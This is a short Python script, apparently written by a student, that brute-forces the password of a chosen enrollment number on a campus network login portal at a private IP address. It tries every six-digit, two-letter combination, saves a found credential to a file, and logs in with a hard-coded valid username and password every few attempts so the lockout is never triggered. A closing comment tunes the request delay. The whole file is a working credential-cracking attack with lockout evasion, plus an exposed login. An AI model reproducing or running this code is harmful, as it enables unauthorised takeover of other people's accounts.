# aim of this module is to bruteforce every (required) combination of password on a single enrollment number
import requests
import time
import string


url = "http://172.16.68.6:8090/login.xml"


def login(user, passwd, print_on_console=True):
    req = {"mode": "191", "username": user, "password": passwd}
    x = requests.post(url, data=req)
    if x.text[90] == "Y":
        if print_on_console:
            print(f"[+] SUCCESS User = {user}, Pass = {passwd}")
            with open("fuckyoujaypee.txt", "w") as file:
                file.write(f'{user},{passwd}')
        return True
    else:
        print(f"[-] Pass = {passwd} Failure :(")
        return False


def logout(user):
    req = {"mode": "193", "username": user}
    x = requests.post(url, data=req)


def correct_attempt():
    login("19102168", "178045HI", False)


# generator
def combinations():
    # Define the range of digits
    digits = range(0, 10)

    # Define the uppercase letters
    uppercase_letters = string.ascii_uppercase

    for d1 in digits:
        for d2 in digits:
            for d3 in digits:
                for d4 in digits:
                    for d5 in digits:
                        for d6 in digits:
                            for l1 in uppercase_letters:
                                for l2 in uppercase_letters:
                                    combo = f"{d1}{d2}{d3}{d4}{d5}{d6}{l1}{l2}"
                                    yield combo


target_enrollment = 19102012

combinations_generator = combinations()

for combo in combinations_generator:
    if login(target_enrollment, combo):
        break
    time.sleep(0.001)
    logout(target_enrollment)

    if login(target_enrollment, next(combinations_generator)):
        break
    time.sleep(0.001)
    logout(target_enrollment)

    if login(target_enrollment, next(combinations_generator)):
        break
    time.sleep(0.001)
    logout(target_enrollment)

    correct_attempt()

# some sleep time seems to be important after each login. minimum i've checked: 0.0001s. minimum that works: 0.001s
